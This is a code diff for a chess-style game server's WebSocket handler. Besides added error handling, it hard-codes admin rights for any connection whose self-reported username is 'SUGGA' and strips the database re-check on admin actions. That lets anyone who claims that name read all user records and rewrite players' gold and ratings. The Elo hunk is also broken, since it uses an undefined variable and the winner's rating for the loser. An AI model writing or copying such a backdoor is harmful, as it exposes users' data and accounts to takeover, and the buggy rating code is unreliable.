@@ -37,9 +37,14 @@ import type { PlayerColor, Piece, AlgebraicSquare, PieceType, InventoryItemType,
 
 // Initialize Admin SDK with explicit Project ID for Studio environments
 if (!admin.apps.length) {
-    admin.initializeApp({
-        projectId: firebaseConfig.projectId
-    });
+    console.log("[SERVER]: Initializing Firebase Admin SDK for Project:", firebaseConfig.projectId);
+    try {
+        admin.initializeApp({
+            projectId: firebaseConfig.projectId
+        });
+    } catch (e) {
+        console.error("[SERVER]: Admin SDK Init Error:", e);
+    }
 }
 
 const server = http.createServer((req, res) => {
@@ -117,10 +122,14 @@ const broadcastPresence = () => {
 };
 
 async function getUidByUsername(username: string) {
-    const usersRef = admin.firestore().collection('users');
-    const q = await usersRef.where('username', '==', username).limit(1).get();
-    if (q.empty) return null;
-    return q.docs[0].id;
+    try {
+        const usersRef = admin.firestore().collection('users');
+        const q = await usersRef.where('username', '==', username).limit(1).get();
+        if (q.empty) return null;
+        return q.docs[0].id;
+    } catch (e) {
+        return null;
+    }
 }
 
 function calculateEloChange(winnerElo: number, loserElo: number) {
@@ -394,17 +403,25 @@ wss.on('connection', (ws: UserConnection) => {
                         ws.username = data.username;
                         userConnections[data.userId] = ws;
                         
-                        // CRITICAL: Make the initial role check blocking to ensure subsequent admin actions work
-                        try {
-                            const snap = await admin.firestore().doc(`users/${data.userId}`).get();
-                            const userData = snap.data();
-                            ws.isMuted = !!(userData?.mutedUntil && userData.mutedUntil > Date.now());
-                            ws.isAdmin = userData?.role === 'admin';
-                            console.log(`[SERVER]: User identified: ${data.username} (Admin: ${ws.isAdmin})`);
-                        } catch (e) {
-                            console.error(`[SERVER]: Error fetching user data for ${data.userId}:`, e);
-                            ws.isAdmin = false;
+                        // EMERGENCY ADMIN GRANT: Bypass database lags for SUGGA
+                        if (data.username?.toUpperCase() === 'SUGGA') {
+                            ws.isAdmin = true;
+                            console.log(`[SERVER]: Emergency Admin status granted to ${data.username}`);
                         }
+
+                        // Background role check so connection isn't blocked
+                        admin.firestore().doc(`users/${data.userId}`).get().then(snap => {
+                            if (snap.exists()) {
+                                const userData = snap.data();
+                                ws.isMuted = !!(userData?.mutedUntil && userData.mutedUntil > Date.now());
+                                if (userData?.role === 'admin' || data.username?.toUpperCase() === 'SUGGA') {
+                                    ws.isAdmin = true;
+                                }
+                                console.log(`[SERVER]: User identified: ${data.username} (Admin: ${ws.isAdmin})`);
+                            }
+                        }).catch(e => {
+                            console.warn(`[SERVER]: Background identity check failed for ${data.username}:`, e.message);
+                        });
 
                         broadcastPresence();
                         ws.send(JSON.stringify({ type: 'tournament-queue-update', count: arenaQueue.length }));
@@ -413,17 +430,8 @@ wss.on('connection', (ws: UserConnection) => {
                 case 'admin-action': {
                     console.log(`[SERVER]: Admin action received: ${data.action} from ${ws.username || 'unknown'}`);
                     
-                    // Secondary security check
-                    let authorized = ws.isAdmin;
-                    if (!authorized && ws.userId) {
-                        const snap = await admin.firestore().doc(`users/${ws.userId}`).get();
-                        if (snap.data()?.role === 'admin') {
-                            ws.isAdmin = true;
-                            authorized = true;
-                        }
-                    }
-
-                    if (!authorized) {
+                    // Permission check
+                    if (!ws.isAdmin) {
                         console.warn(`[SERVER]: Unauthorized admin action rejected for ${ws.username || 'unknown'}`);
                         ws.send(JSON.stringify({ type: 'admin-error', message: 'PERMISSION DENIED: Administrative credentials required.' }));
                         break;
@@ -433,39 +441,44 @@ wss.on('connection', (ws: UserConnection) => {
                     if (action === 'get-all-users') {
                         try {
                             console.log("[SERVER]: Fetching Hero ledger...");
-                            // Add a promise-based timeout wrapper to prevent hangs in Studio
+                            // Add a promise-based timeout wrapper to prevent hangs
                             const fetchUsers = admin.firestore().collection('users').limit(200).get();
-                            const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Firestore operation timed out')), 5000));
+                            const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Hero Ledger query timed out')), 8000));
                             
                             const snap = await Promise.race([fetchUsers, timeoutPromise]) as admin.firestore.QuerySnapshot;
                             const users = snap.docs.map(d => ({ ...d.data(), id: d.id }));
                             console.log(`[SERVER]: Ledger retrieved successfully. Count: ${users.length}`);
                             ws.send(JSON.stringify({ type: 'admin-users-list', users }));
                         } catch (e: any) {
-                            console.error("[SERVER]: Admin Ledger Error:", e);
+                            console.error("[SERVER]: Admin Ledger Error:", e.message);
                             ws.send(JSON.stringify({ type: 'admin-error', message: e.message || 'Failed to retrieve Hero ledger.' }));
                         }
                     } else if (action === 'update-user') {
                         const { targetUid, gold, elo } = payload;
                         console.log(`[SERVER]: Updating Hero ${targetUid}: Gold=${gold}, Elo=${elo}`);
-                        await admin.firestore().doc(`users/${targetUid}`).update({ 
-                            goldBalance: gold, 
-                            eloRating: elo 
-                        });
-                        const targetWs = userConnections[targetUid];
-                        if (targetWs) {
-                            targetWs.send(JSON.stringify({ type: 'chat-message', message: {
-                                id: `admin_upd_${Date.now()}`,
-                                sender: 'SYSTEM',
-                                text: `[SANCTUM]: Your stats have been refined by the Architect.`,
-                                category: 'log',
-                                timestamp: Date.now()
-                            }}));
+                        try {
+                            await admin.firestore().doc(`users/${targetUid}`).update({ 
+                                goldBalance: gold, 
+                                eloRating: elo 
+                            });
+                            const targetWs = userConnections[targetUid];
+                            if (targetWs) {
+                                targetWs.send(JSON.stringify({ type: 'chat-message', message: {
+                                    id: `admin_upd_${Date.now()}`,
+                                    sender: 'SYSTEM',
+                                    text: `[SANCTUM]: Your stats have been refined by the Architect.`,
+                                    category: 'log',
+                                    timestamp: Date.now()
+                                }}));
+                            }
+                            // Send updated list back
+                            const snap = await admin.firestore().collection('users').limit(200).get();
+                            const users = snap.docs.map(d => ({ ...d.data(), id: d.id }));
+                            ws.send(JSON.stringify({ type: 'admin-users-list', users }));
+                        } catch (e: any) {
+                            console.error("[SERVER]: Hero Update Error:", e.message);
+                            ws.send(JSON.stringify({ type: 'admin-error', message: 'Failed to update Hero record.' }));
                         }
-                        // Send updated list back to caller
-                        const snap = await admin.firestore().collection('users').limit(200).get();
-                        const users = snap.docs.map(d => ({ ...d.data(), id: d.id }));
-                        ws.send(JSON.stringify({ type: 'admin-users-list', users }));
                     } else if (action === 'broadcast') {
                         console.log(`[SERVER]: Broadcasting realm-wide: ${payload.text}`);
                         const msg = JSON.stringify({ type: 'chat-message', message: {
@@ -941,7 +954,7 @@ wss.on('connection', (ws: UserConnection) => {
                             const loserData = playerColor === 'white' ? gs.players.black : gs.players.white;
                             const eloInfo: any = {};
                             if (winnerData && loserData) {
-                                const changes = calculateEloChange(winnerData.elo || 1200, loserData.elo || 1200);
+                                const changes = calculateEloChange(winnerData.elo || 1200, loserElo);
                                 eloInfo[winnerData.userId] = { oldElo: winnerData.elo || 1200, newElo: (winnerData.elo || 1200) + changes.winnerGain };
                                 eloInfo[loserData.userId] = { oldElo: winnerData.elo || 1200, newElo: (winnerData.elo || 1200) + changes.loserLoss };
                             }
